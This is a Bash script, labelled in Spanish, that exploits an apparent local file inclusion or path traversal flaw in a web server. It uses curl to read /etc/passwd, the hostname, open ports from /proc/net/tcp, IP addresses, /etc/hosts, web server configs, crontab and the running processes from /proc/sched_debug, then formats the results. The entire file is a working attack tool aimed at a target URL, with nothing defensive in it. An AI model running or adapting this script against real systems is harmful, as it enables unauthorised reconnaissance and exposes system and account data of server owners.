#!/bin/bash

red="\e[0;31m\033[1m"
enc="\033[0m\e[0m"
url=$1

# -------------------------------------- # 

echo -ne "\n${red}[*] Nombre del sistema:${enc} "
url_name="$url/etc/hostname"
curl -s $url_name 

# -------------------------------------- #

echo -ne "${red}[*] Usuarios del sistema:${enc} "
url_passwd="$url/etc/passwd"
curl -s $url_passwd| grep "sh" | awk '{print $1}' FS=":" | tr "\n" "," | sed "s/,/, /g" 

# -------------------------------------- # 

echo -ne "\n${red}[*] Puertos abiertos:${enc} "
url_ports="$url/proc/net/tcp"
for port in $(curl -s $url_ports | awk '{print $2}' | awk '{print $2}' FS=":"); do echo "$((16#$port))" | tr "\n" "," | sed "s/,/, /g" ; done

# -------------------------------------- # 

echo -ne "\n${red}[*] Direcciones IP:${enc} "
url_fibtrie="$url/proc/net/fib_trie"
curl -s $url_fibtrie | grep "LOCAL" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | tr "\n" "," | sed "s/,/, /g" 

# -------------------------------------- # 

echo -ne "\n${red}[*] Dominios:${enc} "
url_hosts="$url/etc/hosts"
curl -s $url_hosts | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | awk '{print $2}' | grep -v "localhost" | tr "\n" "," | sed "s/,/, /g"

# -------------------------------------- #

url_apache1="$url/etc/apache/sites-enabled/000-default.conf"
url_nginx1="$url/etc/nginx/sites-enabled/default"
url_nginx2="$url/etc/nginx/sites-avaiable/default"
if [[ $(curl -s $url_apache1) ]]; then 
	echo -ne "\n${red}[*] Archivo de configuración de apache:${enc}\n"
	curl -s $url_apache1 
elif [[ $(curl -s $url_nginx1 ) ]]; then 
	echo -ne "\n${red}[*] Archivo de configuración de nginx:${enc}\n"
	curl -s $url_nginx1
elif [[ $(curl -s $url_nginx2 ) ]]; then 
	echo -ne "\n${red}[*] Archivo de configuración de nginx:${enc}\n"
	curl -s $url_nginx2
fi

# -------------------------------------- # 

echo -ne "\n${red}[*] Tareas CRON:${enc}\n"
url_cron="$url/etc/crontab"
curl -s $url_cron | grep -P "^\d" 

# -------------------------------------- # 

echo -ne "\n${red}[*] Procesos en ejecucíon:${enc}\n"
url_debug="$url/proc/sched_debug"
curl -s $url_debug | grep -vP "^\d" | awk '{print $1 " -> " $2}' | sort -u | grep -vE "^\.|scsi|system|kworker|cfs|snapd|Shttp" | grep -P "\d" --color=none | grep -P " \d"  

